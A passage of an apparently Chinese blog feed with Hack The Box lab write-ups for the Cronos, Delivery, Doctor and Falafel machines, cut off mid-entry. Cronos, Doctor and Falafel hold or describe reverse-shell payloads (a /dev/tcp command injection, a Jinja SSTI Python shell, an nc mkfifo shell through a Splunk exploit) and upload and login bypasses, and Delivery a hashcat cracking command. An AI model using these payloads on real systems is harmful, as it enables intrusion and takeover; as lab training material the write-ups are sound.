                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.2rmkg5iaeds0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.1lhfnaom3y68.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Cronos - HackTheBox</title>
    <url>/post/d7494865a491/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Cronos/image.514w6dibzlk0.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Cronos/image.22u390btmgps.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Cronos/image.2ac2tufi7dzw.webp"
                     
                ></p>
<p>先看看80端口</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Cronos/image.2pkfab8t0lo0.webp"
                     
                ></p>
<p>扫一下目录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Cronos/image.62aizdy4xrk0.webp"
                     
                ></p>
<p>啥也没有</p>
<p>枚举一下解析域名 <code>dig -x 10.10.10.13 @10.10.10.13</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Cronos/image.5u6vkhsqod40.webp"
                     
                ></p>
<p>添加hosts解析</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Cronos/image.186ent7bo2ww.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Cronos/image.7ibb97p6gws0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Cronos/image.4qmec1ane140.webp"
                     
                ></p>
<p>没找到可利用信息，继续枚举子域名 <code>dig axfr cronos.htb @10.10.10.13</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Cronos/image.187hnii7k1kw.webp"
                     
                ></p>
<p>发现admin.cronos.htb，<a href="www.cronos.htb">www.cronos.htb</a>，添加至hosts文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Cronos/image.28ax43jv4rfo.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Cronos/image.5yi5kfs9cn00.webp"
                     
                ></p>
<p>发现一个登录框，尝试弱口令</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Cronos/image.1wgh008273sw.webp"
                     
                ></p>
<p>尝试万能密码</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Cronos/image.eghwmbpqmpk.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Cronos/image.478vnek9zws0.webp"
                     
                ></p>
<p>又是经典ssrf，直接弹个shell，<code>127.0.0.1&amp;/bin/bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.5/7777 0&gt;&amp;1&quot;</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Cronos/image.422dzaoib2e0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Cronos/image.3ripln880720.webp"
                     
                ></p>
<p>提权</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Cronos/image.6j65cokzz180.webp"
                     
                ></p>
<p>在看下计划任务</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Cronos/image.erq033ftiqo.webp"
                     
                ></p>
<p>发现一个每分钟以root权限执行的php文件，查看有无权限读写</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Cronos/image.vu8i1ahdi6o.webp"
                     
                ></p>
<p>直接替换文件内容，在本地攻击机写好php文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Cronos/image.1blz9jm0akv4.webp"
                     
                ></p>
<p>利用python开启http服务，让靶机下载</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Cronos/image.5qq7z2367rk0.webp"
                     
                ></p>
<p>先备份一下源文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Cronos/image.3lzpr5eer4o0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Cronos/image.4ntrna3zztw0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Cronos/image.7br71zs3qzg0.webp"
                     
                ></p>
<p>攻击机监听</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Cronos/image.4uc7l53w0k80.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Delivery - HackTheBox</title>
    <url>/post/9ef8c7d2ce46/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Delivery/image.2igws1tsj5w0.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Delivery/image.118wdpx1g428.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Delivery/image.2s2m8h5r7580.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Delivery/image.12iahmoirz4w.webp"
                     
                ></p>
<p>访问80端口</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Delivery/image.9cyksjqn00o.webp"
                     
                ></p>
<p>扫一下目录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Delivery/image.2oynwn9nwi00.webp"
                     
                ></p>
<p>没什么用</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Delivery/image.39kvvx7hz940.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Delivery/image.6xpz6f731bk0.webp"
                     
                ></p>
<p>发现域名，添加到hosts文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Delivery/image.7d5t176v89o0.webp"
                     
                ></p>
<p>发现cms名称</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Delivery/image.3088jk1hmge0.webp"
                     
                ></p>
<p>搜一下有无exp可利用</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Delivery/image.31yyipn53k40.webp"
                     
                ></p>
<p>还不知道版本，无法确定是否可利用</p>
<p>继续扫目录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Delivery/image.1tj0me5kkoe8.webp"
                     
                ></p>
<p>扫出一大堆</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Delivery/image.1f7r6o154xa8.webp"
                     
                ></p>
<p>在这可以生成一个票据，之后会给一个查询码和一个邮箱地址</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Delivery/image.1dm92t2hgwww.webp"
                     
                ></p>
<p>在这可以检查票据</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Delivery/image.1fl59jemza9s.webp"
                     
                ></p>
<p>没有可利用信息</p>
<p>之前还在80主页发现一个链接</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Delivery/image.7dhthjgbrsw0.webp"
                     
                ></p>
<p>尝试用那个<a class="link"   href="mailto:&#55;&#55;&#x34;&#57;&#x39;&#x36;&#51;&#x40;&#100;&#101;&#108;&#105;&#118;&#101;&#x72;&#121;&#x2e;&#x68;&#116;&#98;" >&#55;&#55;&#x34;&#57;&#x39;&#x36;&#51;&#x40;&#100;&#101;&#108;&#105;&#118;&#101;&#x72;&#121;&#x2e;&#x68;&#116;&#98;<i class="fas fa-external-link-alt"></i></a>票据邮箱注册一下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Delivery/image.6pmthkq9to00.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Delivery/image.1mw8ppy510ww.webp"
                     
                ></p>
<p>验证链接发到了票据查询这，访问该地址</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Delivery/image.1ik9wielpkgw.webp"
                     
                ></p>
<p>点击internal</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Delivery/image.26aue1zeberk.webp"
                     
                ></p>
<p>这里貌似有一个ssh登陆的用户和密码，尝试登陆一下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Delivery/image.4qsb0lhy8ky0.webp"
                     
                ></p>
<p>提权</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Delivery/image.60fv7uw3jyo0.webp"
                     
                ></p>
<p>在网站目录下发现ost-config.php配置文件，内部包含数据库的连接账户和密码</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Delivery/image.1v0duns4c3z4.webp"
                     
                ></p>
<p>数据库中并无可利用信息</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Delivery/image.6p5opjrjavk0.webp"
                     
                ></p>
<p>在另一个目录又发现一个配置文件，内部同样包含一个数据库的账号和密码</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Delivery/image.5d87bb4y0t80.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Delivery/image.4s0t80tzax40.webp"
                     
                ></p>
<p>在Users表中找到root的密码，尝试爆破一下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Delivery/image.47yrwnw3spw0.webp"
                     
                ></p>
<p>查看一下hash类型</p>
<p><code>https://hashcat.net/wiki/doku.php?id=hashcat</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Delivery/image.3r50vy1v4mu0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Delivery/image.5xr2rv8en580.webp"
                     
                ></p>
<p>这边好像给了提示，PleaseSubscribe!这段是密码的一部分，采用hashcat掩码爆破</p>
<p><code>hashcat -m 3200 -a 3 -i --increment-min 16 --increment-max 20 hash.txt PleaseSubscribe\!?a?a?a?a</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Delivery/image.4cb4wb6icoi0.webp"
                     
                ></p>
<p>切换root</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Delivery/image.48d1w0p1wxu0.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Doctor - HackTheBox</title>
    <url>/post/dea21469d468/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Doctor/image.h6693f3zrc0.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Doctor/image.39j0jceuc260.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Doctor/image.26gum8439nog.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Doctor/image.7di44d9fvwo0.webp"
                     
                ></p>
<p>访问80端口</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Doctor/image.13iixvcap8v4.webp"
                     
                ></p>
<p>下方这个邮箱貌似是个域名地址，添加到hosts文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Doctor/image.4546bpz2wk60.webp"
                     
                ></p>
<p>一个登录框，注册一个进去看看</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Doctor/image.62gj7k34ae40.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Doctor/image.6nwzewk1bbk0.webp"
                     
                ></p>
<p>扫个目录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Doctor/image.4vd1b1e94os0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Doctor/image.3g6a62auxre0.webp"
                     
                ></p>
<p>一个空白页</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Doctor/image.65jb02qlwg40.webp"
                     
                ></p>
<p>之前的文本编辑处有ssti注入，写入注入语句后可以在archive目录下查看结果</p>
<p><code>https://zhuanlan.zhihu.com/p/519944540</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Doctor/image.726kl9ra10g0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Doctor/image.73audhthcx40.webp"
                     
                ></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% for x in ().__class__.__base__.__subclasses__() %&#125;&#123;% if &quot;warning&quot; in x.__name__ %&#125;&#123;&#123;x()._module.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&quot;python3 -c &#x27;import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\&quot;10.10.14.10\&quot;,7777)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2); p=subprocess.call([\&quot;/bin/bash\&quot;, \&quot;-i\&quot;]);&#x27;&quot;).read().zfill(417)&#125;&#125;&#123;%endif%&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Doctor/image.5azgnn52fv00.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Doctor/image.fs1zxp7wzxc.webp"
                     
                ></p>
<p>提权</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Doctor/image.3v5kigy7gcu0.webp"
                     
                ></p>
<p>脚本检测到日志文件中包含有疑似密码的url</p>
<p>尝试切换到其他用户</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Doctor/image.3n7mox4e1bi0.webp"
                     
                ></p>
<p>还检测到开放了8089端口，搜索结果为splunk服务</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Doctor/image.35yf5j8lkf60.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Doctor/image.1b17byzzyglc.webp"
                     
                ></p>
<p>并且该进程是由root权限启动的</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Doctor/image.5wiyqvn7ij40.webp"
                     
                ></p>
<p>nmap先扫一下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Doctor/image.ma07r0iwps0.webp"
                     
                ></p>
<p>访问一下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Doctor/image.2oxs05u6d7c0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Doctor/image.21frwmqr10sg.webp"
                     
                ></p>
<p>登录框，但不知道密码</p>
<p>搜一下有无可利用exp</p>
<p><code>https://github.com/cnotin/SplunkWhisperer2/blob/master/PySplunkWhisperer2/PySplunkWhisperer2_remote.py</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Doctor/image.4veih6g09oq0.webp"
                     
                ></p>
<p>尝试利用</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Doctor/image.5ok8kgbnnqc0.webp"
                     
                ></p>
<p>用shaun用户的账号密码尝试一下</p>
<p><code>python ps.py --host 10.10.10.209 --port 8089 --lhost 10.10.14.10 --lport 443 --username shaun --password &#39;Guitar123&#39; --payload &quot;rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.10 7777 &gt;/tmp/f&quot;</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Doctor/image.57s29hgvwws0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Doctor/image.7itj0xz20kk0.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Falafel - HackTheBox</title>
    <url>/post/40633d637d61/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Falafel/image.b5ng4wro05k.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Falafel/image.3ymiqqi01hy0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Falafel/image.23uisgwe8lkw.webp"
                     
                ></p>
<p>就俩端口，先看80</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Falafel/image.4jwo3311dp80.webp"
                     
                ></p>
<p>右上角有个登录框</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Falafel/image.4jgwxl6c5og0.webp"
                     
                ></p>
<p>猜不出，扫个目录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Falafel/image.4qlevxyt39m0.webp"
                     
                ></p>
<p>在cyberlaw.txt中发现了线索</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Falafel/image.70tfs7fmpd40.webp"
                     
                ></p>
<p>他说有个用户可以在不知道密码的情况下登录管理员的账号，难道是sql注入吗</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Falafel/image.117te0n6z8og.webp"
                     
                ></p>
<p>貌似不行，但不知道密码的情况下怎么登录</p>
<p>貌似真有可能，由于是PHP站点，盲猜他的密码存储方式是MD5加密，在PHP+MD5的情况下，会导致一个问题，如果密文前两位都为0e，那么后面的数据不相同，PHP也会判断为相同</p>
<p><code>https://www.cnblogs.com/du1ge/p/13812118.html</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Falafel/image.1feuejhsouzk.webp"
                     
                ></p>
<p>比如这几个</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Falafel/image.3cx7ijqkca80.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Falafel/image.42bjmyti6x40.webp"
                     
                ></p>
<p>尝试一下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Falafel/image.6wxte5d3gnk0.webp"
                     
                ></p>
<p>猜想成立</p>
<p>这里貌似是个远程文件上传，试试反弹shell</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Falafel/image.qgcz879vnao.webp"
                     
                ></p>
<p>做了限制</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Falafel/image.5dcqdc8ykj40.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Falafel/image.7gifanj30r40.webp"
                     
                ></p>
<p>能访问，但怎么上传php文件</p>
<p>搜了一下，貌似Linux的wget命令有最大字节数限制，如果超过字节数后续的就不会接收，那么可以用这个来绕过上传的限制</p>
<p>先用msf-pattern_create创建一个255长度的字符串</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Falafel/image.3bz8lbm8pnu0.webp"
                     
                ></p>
<p>用这个创建一个文件，删掉最后四个</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Falafel/image.1zh6cq8tmu0w.webp"
                     
                ></p>
<p>上传</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Falafel/image.6d3gkbh4yo80.webp"
                     
                ></p>
<p>看下长度</p>
<p><code>msf-pattern_offset -l 255 -q h7Ah</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Falafel/image.65b4si16kx80.webp"
                     
                ></p>
<p>232个字符</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Falafel/image.11rb8o34wvio.webp"
                     
                ></p>
<p>创建一个232长度的字符串</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Falafel/image.5kwlar59i780.webp"
                     
                ></p>
<p>往里面写个phpinfo测试一下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Falafel/image.4a2e8n7ph8k0.webp"
                     
                ></p>
<p>上传看看</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Falafel/image.603r7wpymks0.webp"
                     
                ></p>
<p>很好</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Falafel/image.1cio3ulc7x34.webp"
                     
                ></p>
<p>把反弹shell改名上传</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Falafel/image.75uey6v972c0.webp"
                     
                ></p>
<p>提权</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Falafel/image.4efn4rxkayg0.webp"
                     
                ></p>
<p>网站目录下发现了数据库的账号密码</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Falafel/image.5h0kq9bv18o0.webp"
                     
                ></p>
<p>没什么利用价值</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Falafel/image.1775nny0cd6k.webp"
                     
                ></p>
<p>靶机上刚好有一个用户名和数据库的一样，尝试切换过去</p>
<p><img  
                     lazyload
